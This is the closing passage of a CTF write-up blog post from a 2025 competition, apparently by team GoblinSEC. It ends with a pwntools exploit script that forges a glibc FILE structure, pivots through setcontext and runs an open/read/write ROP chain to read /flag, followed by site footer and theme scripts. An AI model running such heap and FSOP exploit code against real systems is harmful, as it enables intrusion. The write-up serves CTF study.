</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span> <span class="o">+</span> 
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file_structure_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000010f78b</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000110a7d</span>
</span></span><span class="line"><span class="cl"><span class="c1">#pop rdx ; xor rax; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000b503c</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setcontext&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">61</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mh">0x23</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;setcontext&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">294</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">fake_file_structure_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_ROP</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x204698</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_gadget_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload_ROP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/29.png"
	width="690"
	height="143"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/29_hu_4b72b5c7e00e064c.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/29_hu_a35efc9829d04dd4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="482"
		data-flex-basis="1158px"
	
></p>
<h2 id="ç»“å°¾">ç»“å°¾
</h2><p>è¿™å°±æ˜¯æˆ‘ä»¬<code>GoblinSEC</code>å°é˜Ÿçš„WPï¼Œæ¬¢è¿å…¶å®ƒå¸ˆå‚…ä¸€èµ·äº¤æµ</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-11-07
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/moectf_2025/">
        
        
            <div class="article-image">
                <img src="/p/moectf_2025/moectf2025.786095b001377718ee3c30de18de1b10_hu_4c5ec6589984cda4.webp" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Moectf_2025"
                        
                        data-hash="md5-eGCVsAE3dxjuPDDeGN4bEA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Moectf_2025</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/moectf_2024/">
        
        
            <div class="article-image">
                <img src="/p/moectf_2024/moectf2024.cc156646db374bf0b7ce7c58c0298814_hu_50f438f2977ee422.webp" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Moectf_2024"
                        
                        data-hash="md5-zBVmRts3S/C3znxYwCmIFA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Moectf_2024</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/2025bjtuctf-pwn/">
        
        
            <div class="article-image">
                <img src="/p/2025bjtuctf-pwn/BJTUCTF.90f5cd42e21881be44253e37d54b6795_hu_13bcc8b29ab9b122.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post 2025BJTUCTF-PWN"
                        
                        data-hash="md5-kPXNQuIYgb5EJT431UtnlQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2025BJTUCTF-PWN</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
        
        
            <div class="article-image">
                <img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.521ea07b270c9bd08b40b043442201c4_hu_e37e9b7340f094d8.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç¬¬äºŒæ¬¡AWDæ°´å‹èµ›"
                        
                        data-hash="md5-Uh6geycMm9CLQLBDRCIBxA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç¬¬äºŒæ¬¡AWDæ°´å‹èµ›</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
        
        
            <div class="article-image">
                <img src="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç¬¬ä¸€æ¬¡AWDæ°´å‹èµ›"
                        
                        data-hash="md5-6pl/gHcHxpogH&#43;24KAFVag==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç¬¬ä¸€æ¬¡AWDæ°´å‹èµ›</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        

















































        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†19ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±252.71k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
